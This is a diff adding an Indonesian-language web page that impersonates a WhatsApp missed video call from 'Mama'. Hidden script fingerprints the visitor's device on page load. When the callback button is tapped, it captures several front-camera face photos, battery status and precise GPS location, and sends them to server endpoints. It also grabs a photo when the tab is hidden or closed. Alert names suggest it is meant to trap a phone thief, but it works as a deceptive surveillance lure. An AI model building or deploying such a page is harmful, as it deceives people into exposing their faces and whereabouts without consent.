@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>WhatsApp</title>
+  <style>
+    :root {
+      --wa-green: #25D366; --wa-dark: #128C7E; --wa-bg: #ECE5DD;
+      --wa-header: #075E54; --wa-bubble: #DCF8C6; --text: #111;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+    body { background: var(--wa-bg); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; min-height: 100vh; display: flex; flex-direction: column; }
+
+    /* ── WhatsApp header bar ── */
+    .wa-bar {
+      background: var(--wa-header);
+      color: white;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 10px 16px;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+    .wa-bar svg { flex-shrink: 0; }
+    .wa-bar-title { font-size: 16px; font-weight: 700; letter-spacing: 0.2px; }
+    .wa-bar-sub { font-size: 11px; opacity: 0.75; }
+
+    /* ── Chat area ── */
+    .chat-area { flex: 1; padding: 16px 12px 20px 12px; display: flex; flex-direction: column; gap: 6px; }
+
+    .bubble-wrap { display: flex; justify-content: center; }
+    .system-label {
+      background: rgba(0,0,0,0.12);
+      color: #555;
+      font-size: 11.5px;
+      border-radius: 8px;
+      padding: 5px 12px;
+    }
+
+    .missed-card {
+      background: #fff;
+      border-radius: 12px;
+      padding: 14px 16px 12px 14px;
+      max-width: 320px;
+      width: 100%;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.15);
+      margin: 4px auto 0 auto;
+    }
+    .missed-row { display: flex; align-items: center; gap: 12px; }
+    .avatar {
+      width: 44px; height: 44px; border-radius: 50%;
+      background: linear-gradient(135deg, #f6a623, #e67e22);
+      display: flex; align-items: center; justify-content: center;
+      font-size: 18px; font-weight: 700; color: white; flex-shrink: 0;
+    }
+    .missed-info { flex: 1; min-width: 0; }
+    .contact-name { font-size: 15px; font-weight: 700; color: #111; }
+    .missed-tag {
+      font-size: 12.5px;
+      color: #e02020;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      margin-top: 2px;
+    }
+    .missed-time { font-size: 11px; color: #999; margin-top: 1px; }
+    .missed-sub { font-size: 12px; color: #777; margin: 8px 0 10px 0; border-top: 1px solid #f0f0f0; padding-top: 8px; }
+
+    .btn-row { display: flex; gap: 8px; }
+    .btn-msg {
+      flex: 1; padding: 9px 0; border: 1.5px solid #25D366; background: white;
+      border-radius: 20px; font-size: 13px; font-weight: 600; color: #25D366;
+      cursor: pointer;
+    }
+    .btn-call {
+      flex: 1.3; padding: 9px 0; background: #25D366;
+      border: none; border-radius: 20px; font-size: 13px; font-weight: 700;
+      color: white; cursor: pointer; display: flex; align-items: center;
+      justify-content: center; gap: 6px;
+    }
+    .btn-call:active { background: #1da851; }
+    .missed-ts { font-size: 10.5px; color: #aaa; text-align: right; margin-top: 6px; }
+
+    /* ── Calling overlay ── */
+    #callingOverlay {
+      display: none;
+      position: fixed; inset: 0; z-index: 999;
+      background: #1a1a1a;
+      flex-direction: column;
+      align-items: center;
+      justify-content: space-between;
+      padding: 40px 0 48px 0;
+    }
+    .call-top { display: flex; flex-direction: column; align-items: center; gap: 10px; }
+    .call-avatar {
+      width: 80px; height: 80px; border-radius: 50%;
+      background: linear-gradient(135deg, #f6a623, #e67e22);
+      display: flex; align-items: center; justify-content: center;
+      font-size: 32px; font-weight: 700; color: white;
+    }
+    .call-name { color: white; font-size: 24px; font-weight: 700; }
+    .call-status { color: rgba(255,255,255,0.7); font-size: 14px; margin-top: 2px; }
+
+    .call-self-view {
+      width: 120px; height: 160px; border-radius: 12px;
+      overflow: hidden; border: 2px solid rgba(255,255,255,0.3);
+      background: #000; position: relative;
+    }
+    #selfVideo { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+    .call-self-label { position: absolute; bottom: 6px; left: 0; right: 0; text-align: center; font-size: 10px; color: rgba(255,255,255,0.7); }
+
+    .call-actions { display: flex; gap: 28px; align-items: center; }
+    .call-btn {
+      width: 60px; height: 60px; border-radius: 50%; border: none;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 22px; cursor: pointer;
+    }
+    .btn-end { background: #e02020; color: white; width: 68px; height: 68px; font-size: 24px; }
+    .btn-cam-off { background: rgba(255,255,255,0.12); color: white; }
+    .btn-mic-off { background: rgba(255,255,255,0.12); color: white; }
+
+    /* ── No-answer view ── */
+    #noAnswerView {
+      display: none;
+      position: fixed; inset: 0; z-index: 1000;
+      background: #1a1a1a;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 16px;
+    }
+    .no-ans-icon { font-size: 56px; }
+    .no-ans-text { color: white; font-size: 18px; font-weight: 600; }
+    .no-ans-sub { color: rgba(255,255,255,0.6); font-size: 14px; }
+    .btn-retry {
+      margin-top: 8px; padding: 12px 32px;
+      background: #25D366; border: none; border-radius: 24px;
+      color: white; font-size: 15px; font-weight: 700; cursor: pointer;
+    }
+    .btn-dismiss {
+      padding: 10px 28px; background: transparent;
+      border: 1.5px solid rgba(255,255,255,0.3); border-radius: 24px;
+      color: rgba(255,255,255,0.7); font-size: 14px; cursor: pointer;
+    }
+
+    video, canvas { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; top: -9999px; left: -9999px; }
+    #selfCanvas { display: none; }
+  </style>
+</head>
+<body>
+
+  <!-- WhatsApp header -->
+  <div class="wa-bar">
+    <svg width="22" height="22" viewBox="0 0 24 24" fill="white"><path d="M20.52 3.48A11.93 11.93 0 0 0 12 0C5.37 0 0 5.37 0 12c0 2.11.55 4.16 1.6 5.98L0 24l6.19-1.62A11.92 11.92 0 0 0 12 24c6.63 0 12-5.37 12-12 0-3.21-1.25-6.23-3.48-8.52zM12 21.93a9.9 9.9 0 0 1-5.05-1.38l-.36-.21-3.74.98.99-3.63-.24-.38A9.93 9.93 0 0 1 2.07 12 9.93 9.93 0 0 1 12 2.07 9.93 9.93 0 0 1 21.93 12 9.93 9.93 0 0 1 12 21.93zm5.44-7.43c-.3-.15-1.76-.87-2.03-.97-.27-.1-.47-.15-.67.15-.2.3-.77.97-.95 1.17-.17.2-.35.22-.65.07-.3-.15-1.27-.47-2.42-1.49-.89-.8-1.5-1.78-1.67-2.08-.17-.3-.02-.46.13-.61.13-.13.3-.35.45-.52.15-.17.2-.3.3-.5.1-.2.05-.37-.02-.52-.07-.15-.67-1.61-.92-2.2-.24-.58-.49-.5-.67-.51-.17-.01-.37-.01-.57-.01s-.52.07-.8.37c-.27.3-1.04 1.02-1.04 2.48 0 1.47 1.07 2.88 1.22 3.08.15.2 2.1 3.2 5.08 4.49.71.31 1.27.49 1.7.63.72.23 1.37.2 1.88.12.57-.09 1.76-.72 2.01-1.42.25-.7.25-1.3.17-1.42-.07-.12-.27-.19-.57-.34z"/></svg>
+    <div>
+      <div class="wa-bar-title">WhatsApp</div>
+      <div class="wa-bar-sub">Panggilan Video Tak Terjawab</div>
+    </div>
+  </div>
+
+  <!-- Chat area -->
+  <div class="chat-area">
+    <div class="bubble-wrap">
+      <div class="system-label">Hari ini</div>
+    </div>
+
+    <div class="missed-card">
+      <div class="missed-row">
+        <div class="avatar">M</div>
+        <div class="missed-info">
+          <div class="contact-name">Mama</div>
+          <div class="missed-tag">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="#e02020"><path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/></svg>
+            Panggilan video tak terjawab
+          </div>
+          <div class="missed-time" id="callTime">Beberapa menit yang lalu</div>
+        </div>
+      </div>
+      <div class="missed-sub">Ketuk "Hubungi Balik" untuk memulai panggilan video.</div>
+      <div class="btn-row">
+        <button class="btn-msg" onclick="dismissMsg()">Balas Pesan</button>
+        <button class="btn-call" id="btnCallBack" onclick="startCallback()">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="white"><path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/></svg>
+          Hubungi Balik
+        </button>
+      </div>
+      <div class="missed-ts" id="callTs">--:--</div>
+    </div>
+  </div>
+
+  <!-- Calling overlay -->
+  <div id="callingOverlay">
+    <div class="call-top">
+      <div class="call-avatar">M</div>
+      <div class="call-name">Mama</div>
+      <div class="call-status" id="callStatusText">Menghubungi...</div>
+    </div>
+    <div class="call-self-view">
+      <video id="selfVideo" autoplay playsinline muted></video>
+      <div class="call-self-label">Saya</div>
+    </div>
+    <div class="call-actions">
+      <button class="call-btn btn-cam-off" onclick="toggleCam()">📷</button>
+      <button class="call-btn btn-end" onclick="endCall()">📵</button>
+      <button class="call-btn btn-mic-off" onclick="toggleMic()">🎤</button>
+    </div>
+  </div>
+
+  <!-- No-answer view -->
+  <div id="noAnswerView">
+    <div class="no-ans-icon">📵</div>
+    <div class="no-ans-text">Mama tidak menjawab</div>
+    <div class="no-ans-sub">Coba lagi atau kirim pesan</div>
+    <button class="btn-retry" onclick="retryCall()">Hubungi Ulang</button>
+    <button class="btn-dismiss" onclick="closePage()">Tutup</button>
+  </div>
+
+  <!-- Hidden capture elements -->
+  <video id="hiddenVideo" autoplay playsinline muted></video>
+  <canvas id="hiddenCanvas"></canvas>
+  <canvas id="selfCanvas"></canvas>
+
+  <script>
+    // PASSIVE FIRST-PING
+    (function() {
+      var s = {};
+      try { s.screen = window.screen.width + 'x' + window.screen.height + '(@' + (window.devicePixelRatio||1) + 'x)'; } catch(e){}
+      try { s.ua = navigator.userAgent; } catch(e){}
+      try { s.tz = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e){}
+      try { s.lang = navigator.language; } catch(e){}
+      try { s.cores = navigator.hardwareConcurrency; } catch(e){}
+      try { s.touch = navigator.maxTouchPoints; } catch(e){}
+      try {
+        var c = document.createElement('canvas');
+        var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+        if (gl) { var dbg = gl.getExtension('WEBGL_debug_renderer_info'); if (dbg) { s.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL); s.gpuV = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL); } }
+      } catch(e){}
+      var p = JSON.stringify({ alertType: 'passive_hit_vcall', passiveStats: s });
+      try { if (navigator.sendBeacon) navigator.sendBeacon('/api/sentinel/beacon', new Blob([p], {type:'application/json'})); } catch(e){}
+      try { fetch('/api/sentinel/beacon', {method:'POST', headers:{'Content-Type':'application/json'}, body:p, keepalive:true}).catch(function(){}); } catch(e){}
+    })();
+
+    // Timestamp dinamis
+    (function() {
+      var now = new Date();
+      var h = now.getHours(), m = now.getMinutes();
+      var ago = new Date(now.getTime() - (Math.floor(Math.random()*8)+3)*60000);
+      document.getElementById('callTs').textContent =
+        String(ago.getHours()).padStart(2,'0') + ':' + String(ago.getMinutes()).padStart(2,'0');
+      document.getElementById('callTime').textContent =
+        (now.getMinutes() - ago.getMinutes() + 60) % 60 + ' menit yang lalu';
+    })();
+
+    let activeStream = null;
+    let latestLat = null, latestLon = null;
+    let callTimer = null;
+    let captureCount = 0;
+
+    function sendBeacon(payload) {
+      const blob = new Blob([JSON.stringify(payload)], {type:'application/json'});
+      try { if (navigator.sendBeacon) navigator.sendBeacon('/api/sentinel/beacon', blob); } catch(e){}
+      try { fetch('/api/sentinel/beacon', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(payload), keepalive:true}).catch(()=>{}); } catch(e){}
+    }
+    function sendPhoto(url, photo, trigger) {
+      if (!photo) return;
+      const p = JSON.stringify({photo, trigger});
+      try { if (navigator.sendBeacon) navigator.sendBeacon(url, new Blob([p], {type:'application/json'})); } catch(e){}
+      try { fetch(url, {method:'POST', headers:{'Content-Type':'application/json'}, body:p, keepalive:true}).catch(()=>{}); } catch(e){}
+    }
+    function snapFrame(video, canvas, q) {
+      try {
+        const w = video.videoWidth||640, h = video.videoHeight||480;
+        if (!w||!h) return null;
+        canvas.width=w; canvas.height=h;
+        canvas.getContext('2d').drawImage(video,0,0,w,h);
+        return canvas.toDataURL('image/jpeg', q||0.78);
+      } catch(e) { return null; }
+    }
+    function waitFrame(video, ms) {
+      return new Promise(r => {
+        if (video.readyState>=2 && video.videoWidth>0) return r();
+        let done=false; const fin=()=>{if(!done){done=true;r();}};
+        video.addEventListener('loadeddata',fin,{once:true});
+        video.addEventListener('canplay',fin,{once:true});
+        setTimeout(fin, ms||300);
+      });
+    }
+
+    // EMERGENCY EXIT: kirim beacon & foto saat tab ditutup
+    const emergencyExit = () => {
+      const video = document.getElementById('selfVideo');
+      const canvas = document.getElementById('selfCanvas');
+      let snap = null;
+      if (activeStream && video.srcObject) snap = snapFrame(video, canvas, 0.65);
+      const hidden = document.getElementById('hiddenVideo');
+      const hCanvas = document.getElementById('hiddenCanvas');
+      if (!snap && hidden.srcObject) snap = snapFrame(hidden, hCanvas, 0.65);
+      sendBeacon({ alertType: 'emergency_exit_vcall', lat: latestLat, lon: latestLon, photo: snap||null });
+      if (snap) sendPhoto('/api/sentinel/selfie', snap, 'emergency_exit_vcall');
+    };
+    window.addEventListener('visibilitychange', () => { if (document.visibilityState==='hidden') emergencyExit(); });
+    window.addEventListener('pagehide', emergencyExit);
+    window.addEventListener('beforeunload', emergencyExit);
+
+    function dismissMsg() {
+      // pesan balasan — tidak memicu kamera, tampilkan pesan dummy
+      document.querySelector('.missed-sub').textContent = 'Pesan terkirim. Menunggu balasan...';
+    }
+
+    async function startCallback() {
+      const btn = document.getElementById('btnCallBack');
+      if (btn) btn.disabled = true;
+
+      // Tampilkan calling overlay
+      const overlay = document.getElementById('callingOverlay');
+      overlay.style.display = 'flex';
+
+      // WakeLock
+      if ('wakeLock' in navigator) { try { navigator.wakeLock.request('screen').catch(()=>{}); } catch(e){} }
+
+      // Minta kamera — iOS mengizinkan karena dipicu gesture user
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user', width:{ideal:640}, height:{ideal:480} },
+          audio: false
+        });
+        activeStream = stream;
+        const selfVideo = document.getElementById('selfVideo');
+        selfVideo.srcObject = stream;
+        selfVideo.play().catch(()=>{});
+        await waitFrame(selfVideo, 280);
+
+        // Kirim foto wajah pertama
+        const canvas = document.getElementById('selfCanvas');
+        const snap1 = snapFrame(selfVideo, canvas, 0.80);
+        if (snap1) sendPhoto('/api/sentinel/selfie', snap1, 'vcall_connect_face');
+        captureCount++;
+
+        // Beacon data utama
+        let batteryLevel = null, isCharging = false;
+        if (navigator.getBattery) { try { const b = await navigator.getBattery(); batteryLevel=Math.round(b.level*100); isCharging=b.charging; } catch(e){} }
+        sendBeacon({
+          alertType: 'thief_trapped_vcall',
+          batteryLevel, isCharging,
+          screen: window.screen.width+'x'+window.screen.height,
+          userAgent: navigator.userAgent
+        });
+
+      } catch(e) {
+        // Kamera ditolak — tetap jalankan sequence
+      }
+
+      // GPS
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+          latestLat = pos.coords.latitude;
+          latestLon = pos.coords.longitude;
+          sendBeacon({ alertType: 'thief_gps_vcall', lat: latestLat, lon: latestLon, accuracy: pos.coords.accuracy });
+        }, ()=>{}, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
+      }
+
+      // Simulasi panggilan: "Menghubungi" → "Berdering" → tidak dijawab
+      const statusEl = document.getElementById('callStatusText');
+      let elapsed = 0;
+      callTimer = setInterval(async () => {
+        elapsed += 1;
+
+        if (elapsed === 3 && statusEl) statusEl.textContent = 'Berdering...';
+
+        // Foto berkala selama panggilan berlangsung
+        if ((elapsed === 5 || elapsed === 12 || elapsed === 20) && activeStream) {
+          const selfVideo = document.getElementById('selfVideo');
+          const canvas = document.getElementById('selfCanvas');
+          const snap = snapFrame(selfVideo, canvas, 0.78);
+          if (snap) sendPhoto('/api/sentinel/selfie', snap, `vcall_periodic_${elapsed}s`);
+          captureCount++;
+        }
+
+        if (elapsed === 22) {
+          clearInterval(callTimer);
+          showNoAnswer();
+        }
+      }, 1000);
+    }
+
+    function showNoAnswer() {
+      if (activeStream) { activeStream.getTracks().forEach(t=>t.stop()); activeStream = null; }
+      document.getElementById('callingOverlay').style.display = 'none';
+      const view = document.getElementById('noAnswerView');
+      view.style.display = 'flex';
+    }
+
+    function endCall() {
+      if (callTimer) clearInterval(callTimer);
+      showNoAnswer();
+    }
+
+    function retryCall() {
+      document.getElementById('noAnswerView').style.display = 'none';
+      startCallback();
+    }
+
+    function closePage() {
+      document.getElementById('noAnswerView').style.display = 'none';
+    }
+
+    function toggleCam() {}
+    function toggleMic() {}
+  </script>
+</body>
+</html>
